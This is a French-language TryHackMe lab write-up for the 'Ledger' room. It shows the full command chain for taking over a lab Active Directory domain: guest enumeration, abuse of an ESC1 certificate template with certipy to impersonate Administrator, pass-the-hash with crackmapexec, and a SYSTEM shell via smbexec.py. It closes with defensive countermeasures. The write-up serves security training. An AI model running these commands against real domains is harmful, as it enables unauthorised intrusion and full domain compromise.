
---


````markdown
# 🧾 TryHackMe - Ledger – Write-up Complet (FR)

**Room :** [https://tryhackme.com/room/ledger](https://tryhackme.com/room/ledger)

---

## 🧠 Objectif

Exploiter une machine Windows Active Directory vulnérable (`labyrinth.thm.local`) pour obtenir une exécution de commande en tant qu’administrateur de domaine via une attaque AD CS (ESC1) et la réutilisation de hash NTLM.

---

## 🔍 1. Scan et découverte initiale

### 🔎 Scan Nmap

nmap -Pn -sC -sV -T4 -p- labyrinth.thm.local
````

* Port 445 (SMB) ouvert : cible un contrôleur de domaine Windows.
* Ports 389 (LDAP) et 88 (Kerberos) également ouverts, environnement Active Directory confirmé.

### 🛠️ Préparation

Ajout dans `/etc/hosts` :

```
<IP> labyrinth.thm.local thm.local LABYRINTH
```

### 🧪 Tests d'accès invités

nxc smb labyrinth.thm.local -u 'guest' -p ''
nxc ldap labyrinth.thm.local -u 'guest' -p '' --users
```

✅ Plusieurs utilisateurs récupérés, dont deux partagent le même mot de passe.

### 🔐 Accès initial

nxc smb labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p '[REDACTED]'
```

✅ Connexion confirmée.
Utilisation de Remmina pour ouvrir un accès graphique RDP.
📁 `user.txt` récupéré.

---

## 🧩 2. Exploitation d'AD CS – ESC1

### 🔬 Découverte de la vulnérabilité


certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p '[REDACTED]' -target labyrinth.thm.local -stdout -vulnerable
```

* Modèle de certificat vulnérable : **ServerAuth**.

### ❗ Détails de la faille ESC1

* ESC1 (Enterprise Security Control 1) permet de forger un certificat pour n’importe quel utilisateur, même Domain Admin.
* Conditions :

  * `ENROLLEE_SUPPLIES_SUBJECT` activé
  * `Client Authentication EKU` présent
  * Groupe `Authenticated Users` peut s’enrôler

### 📥 Requête de certificat en se faisant passer pour l’administrateur

certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password '[REDACTED]' \
  -ca thm-LABYRINTH-CA -template ServerAuth \
  -target labyrinth.thm.local -upn Administrator@thm.local
```

✔️ Un certificat `.pfx` est généré.

### 🪪 Authentification avec le certificat

certipy-ad auth -pfx administrator.pfx
```

✔️ Récupération d’un hash NTLM valide du compte Administrator.

---

## 🔁 3. Test du hash NTLM (Pass-the-Hash)

cme smb labyrinth.thm.local -u Administrator -H 07d677XXXXXXX322 --kdcHost labyrinth.thm.local
```

✔️ Accès administrateur confirmé. 🎉

---

## 🚀 4. Exécution de commande à distance (Shell SYSTEM)

smbexec.py -k -hashes :07d677XXXXXXX322 THM.LOCAL/Administrator@labyrinth.thm.local
```

✅ Shell SYSTEM via SMB.
📁 Récupération de `root.txt`.

---

## 🔐 5. Bonnes pratiques défensives (Blue Team)

| Problème                        | Contremesure recommandée                                  |
| ------------------------------- | --------------------------------------------------------- |
| SMB exposé                      | Restreindre les accès SMB aux hôtes autorisés             |
| Pass-the-Hash NTLM              | Activer LAPS, Forcer Kerberos (désactiver NTLM)           |
| ESC1 sur modèles de certificats | Désactiver ENROLLEE\_SUPPLIES\_SUBJECT, restreindre accès |
| Pas de monitoring ADCS          | Auditer les requêtes de certificats                       |
| Pas de journalisation 4625      | Activer l’audit des échecs d’authentification             |
| Aucune segmentation réseau      | Isoler les contrôleurs de domaine                         |
| Pas de détection post-exploit   | Déployer un SIEM avec règles sur smbexec, psexec, wmiexec |

---

## ✅ En résumé

* L’accès initial est facilité par un compte avec mot de passe faible.
* La faille principale repose sur ESC1, mal configuré dans l’Active Directory Certificate Services.
* La réutilisation d’un hash NTLM permet une élévation de privilège jusqu’à Administrator.
* Une exécution de commande à distance est réalisée via SMBExec.

---

## 🧠 Outils utilisés

* nxc (NetExec)
* certipy
* crackmapexec
* smbexec.py

---

## 📌 À retenir pour la défense

* Surveillez les modèles de certificats.
* Ne laissez pas les utilisateurs choisir leurs propres sujets.
* Sécurisez SMB et éliminez NTLM si possible.
* Déployez la journalisation et les alertes ADCS.

```

